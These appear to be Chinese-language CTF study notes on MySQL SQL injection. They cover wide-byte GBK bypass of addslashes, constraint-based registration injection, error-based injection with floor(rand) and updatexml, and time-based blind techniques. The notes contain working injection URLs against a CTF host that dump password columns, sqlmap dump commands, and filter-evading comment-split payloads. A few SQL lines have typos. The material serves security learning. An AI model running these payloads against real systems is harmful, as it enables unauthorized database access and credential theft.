# SQL注入



## 宽字节注入

### 常见的编码方式



- ASCII

- GBK：汉字内码扩展规范

- URL转码：

  - 空格   %20

  - '      %27

  - \#         %23

  - \          %5C





### addslashes函数



string addlashes(string $str)

使用反斜线引用字符串

返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号，双引号，反斜线，NULL



如何从addlashes函数逃逸出来？

\1. \前面再加一个\（或单数个），变成\\'，这样\被转义了，’逃出了限制

2.把\弄没



### 原理



原理：宽字节注入是利用Mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）



'        ->   \'      ->    %5C%27

%df  ->    %df\'    ->%df%5C%27



## 宽字节注入例题

```sql
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1'
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa'
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa' order by 3 #
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa' order by 5 #
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa' order by 2 #
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa' order by 3 %23
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa' order by 2 %23
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa' union select 1,2%23
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa' union select 1,database()%23
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x637466%23
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa' union select 1,group_concat(pw) from ctf%23
```



SQLmap的使用

```shell
sqlmap -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa%27
sqlmap -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa%27 --hex
sqlmap -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa%27 --hex --dbs
sqlmap -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa%27 --hex -D sec-chinalover
sqlmap -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa%27 --hex -D sec-chinalover --tables
sqlmap -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa%27 --hex -D sec-chinalover -T ctf2 --dump
sqlmap -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa%27 --hex -D sec-chinalover -T ctf2 --dump --prefix
```





## 约束条件注入



### 场景



用户注册的时候（本质是往数据库里面插入一条数据）



### 问题



在查询的时候，**会自动略去后面的空格**去查询

插入数据的时候，首先会查询表中是否存在数据，这里的```username```长度为30位

如果插入31位的 那么表中肯定不会出现，所以数据会直接插入数据库中



### 思路



用户名设置为`admin 1`，中间的空格越多越好，因为不知道目标服务器是限制的字段有多大

大于30位的不可能存在于数据库中，所以，我们可以用这个用户名注册成功，又因为30位之后的会抛弃，空格也会自动略过



### 最终



```sql
select @@global.sql_mode;
SET GLOBAL sql_mode='ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION';
```





这时候的password就是自己控制的





### 实验

```sql
创建数据表
CREATE TABLE user(
	id int not null auto_increment,
	username varchar(30) not null,
    password varchar(30) not null,
    primary key(id)
);

注册
insert into user values('', 'admin', 123456789)

select * from user;
select * from user where username='admin' and password = '123456789';
select * from user where username='admin';
select * from user where username='admin   '
insert into user values('', '1234567891234567891234567891', 123456789)
select * from user where username='1234567891234567891234567891';
insert into user values('', 'admin                                1', 123456789)
select * from user;
select * from user where username='admin';
```



## 报错注入



### 公式



```sql
and (select 1 from (select count(*). concat(user(), floor(rand(0)*2))x from information_schema.tables group by x)a);
```



> select count(*). concat(user(), floor(rand(0)*2))x from information_schema.tables group by x定义为别名a
>
> concat(user(), floor(rand(0)*2))   被concat为一个 定义别名为x
>
> count(*) 统计整个的一个结果



### 相关函数



- rand()

  > 用于产生一个0～1的随机数

- floor()

  > 向下取整

- rand函数生成0～1的随机数，使用floor函数向下取整，值是固定的"0"，我们将rand*2，得到的值就是不固定的"0"或"1"



### 探究



```SQL
select count(*) from table1 group by floor(rand()*2);

select count(*) from table2 gourp by floor(rand()*2);

select count(*) from table3 group by floor(rand()*2);
```



> 三个表数据量不同
>
> table1一条数据，table2两条数据，table3三条数据
>
> 第一条不会报错，两条数据有时报错有时不报错，三条数据也是一样
>
> rand和公式中不同 没有0存在



### 猜测



语句执行的时候会建立一个虚拟表，整个工作流程大致如下。开始查询数据时，读取数据库数据，查看虚拟表是否存在，不存在则插入新纪录，存在则count(*)字段直接加



### 推测



从```select floor(rand(0)*2) from table```可以看到在一次多记录的查询过程中```floor(rand(0)*2)```的值是定性的，为011011，应该就是```floor(rand(0)*2)```被计算多次导致的



1. 查询前会先建立空虚拟表
2. 取第一条记录，执行```floor(rand(0)*2)```，发现结果为0（第一次计算），查询虚拟表，发现0的键值不存在，则```floor(rand(0)*2)```会被再计算一次，结果为1（第二次计算），插入虚表，这时第一条记录
3. 查询第二条记录，再次计算```floor(rand(0)*2)```，发现结果为1（第三次计算），查询虚表，发现1的键值存在，所以```floor(rand(0)*2)```不会被计算第二次，直接count(*)加1，第二条记录查询完毕
4. 查询第三条记录，再次计算```floor(rand(0)*2)```，发现结果为0（第4次计算），查询虚表，发现键值没有0，则数据库常识插入一条新的数据，再插入数据时```floor(rand(0)*2)```被再次计算，作为虚表的主键，其值为1（第5次计算），然后1这个主键已经存在于虚拟表中，而新计算的值也为1（主键键值必需唯一），所以插入的时候就直接报错了



由于没加入随机因子，所以```floor(rand()*2)```是不可测的，因此在两条数据的时候，只要出现下面的情况，即可报错





## 报错注入例题

```sql
updatexml(1, concat(0x7e, (version())), 0);

view source
<!-- $sql="select * from users where username='$username' and password='$password'";  -->

username=' or updatexml(1, concat(0x7e, (version())), 0)%23
&password=QWERasdf1234


测试被检测的数据
burp

测试注释符
%23
-- d
'；%--
username='/*&password=*/ or '1
username=' and updatexml/*&password=*/(1, concat(0x7e, (version())), 0) or '1
username=' and updatexml/*&password=*/(1, concat(0x7e, (select database())), 0) or '1
username=' and updatexml/*&password=*/(1, concat(0x7e, (select table_name from information_schema.tables where table_sechema = database())), 0) or '1

username = ' 1 like 1&password=a
username = and '1 regexp 1&password=a
username=' and updatexml/*&password=*/(1, concat(0x7e, (select table_name from information_schema.tables where table_sechema regexp database())),0) or '1
```









## 时间盲注



### 函数SLEEP（duration）



函数使用说明：睡眠（暂停）时间为duration参数给定的秒数，然后返回0。若SLEEP()被中断，它会返回1。



SELECT * FROM sectest id=1 AND SLEEP(3);



关于or语句的逻辑判断；

SELECT依次遍历所有数据，不满足前面的条件就执行后面的条件。



SELECT * FROM sectest id=5 OR SLEEP(3);



### 配合if条件触发



IF(expr1,expr2,expre3)



如果expr1是TRUE(expr1 <> 0 and expr1 <> NULL)，则IF()的返回值为expr2

否则返回值为expr3



IF()的返回值为数字值或字符串值，具体情况视其所在语境而定



SELECT * FROM table WHRER id=1 AND IF(DATABASE()=' ', SLEEP(3),NULL))



### 截取函数



substring()和substr()

SUBSTRING(str, pos), SUBSTRING(str FROM pos) SUBSTRING(str,pos,len),

SUBSTRING(str FROM pos FOR len) substr(string, start, length)



参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度



substring_index()

substring_index(str,delim,count)

说明：subsrting_index（被截取字段，关键字，关键字）



```sql
SELECT * FROM user WHERE username="a" OR IF(SUBSTR((SELECT username FROM user WHERE id=1),1,1)='a',SLEEP(3),0);

SELECT SUBSTR('abcde',1,1);		# 'a'
SELECT SUBSTR('abcde',2,1);		# 'b'
```



```sql
SELECT SUBSTRING('abcde',2,2);
SELECT SUBSTRING('abcde',2);
SELECT SUBSTRING('abcde' from 2);
SELECT SUBSTRING('abcde' from 2 for 1);
```



```sql
SELECT SUBSTRING_INDEX('aaabbbccc','a',2);
SELECT SUBSTRING_INDEX('aaabbbccc','b',2);
SELECT SUBSTRING_INDEX('aaabbbccc','b',-2);
```



```sql
SELECT * FROM user WHERE password RLIKE '^12';
SELECT * FROM user WHERE password REGEXP '^12';
```



内容非常多，思路千变万化，知道的越多能利用的技巧越多



代替IF的一种方式

```sql
SELECT CASE WHEN username='admin' THEN (sleep(3)) ELSE 'xxxx' END FROM user;
SELECT CASE WHEN username='admin' THEN 'admin' ELSE 'xxxx' END FROM user;
```



逐字注入

能够截取字符，同时能触发延时即可

```sql
SELECT * FROM table WHERE id=1 AND (IF(SUBSTR(DATABASE(),1,1)=' ', SLEEP(4), NULL));
SELECT * FROM table WHERE id=1 AND (IF(ASCII(DATABASE(),1,1)=100, SLEEP(4), NULL));
```



### 除了SLEEP之外的延时



#### BENCHMARK(count, expr)



BENCHMARK()函数重复count次执行表达式expr。

它可以被用于计算MySQL处理表达式的速度，结果值通常为0。



SELECT BENCHMARK(10000000,sha(1));



#### 笛卡尔积



```sql
SELECT COUNT(*) FROM information_schema.columns A, infomation_schema.columns B, information_schema.tables C;

SELECT COUNT(*) FROM user A, user B;
```



指数集增长，排列组合，能过很多检测，没有敏感函数



#### GET_LOCK(str, timeout)



函数使用说明：设法使用字符串str给定的名字得到一个锁，超时为timeout秒



```sql
SELECT GET_LOCK('  a',1);
```



#### RLIKE



通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。



```SQL
SELECT CONCAT(RPAD(1,999999,'a'),RPAD(1,999999,'a'),RPAD(1,999999,'a'),RPAD(1,999999,'a'),RPAD(1,999999,'a'),RPAD(1,999999,'a'),RPAD(1,999999,'a'),RPAD(1,999999,'a'),RPAD(1,999999,'a'),RPAD(1,999999,'a'),RPAD(1,999999,'a'),RPAD(1,999999,'a'),RPAD(1,999999,'a'),RPAD(1,999999,'a'),RPAD(1,999999,'a'),RPAD(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b';
```



## 时间盲注例题

http://www.shiyanbar.com/ctf/1941





































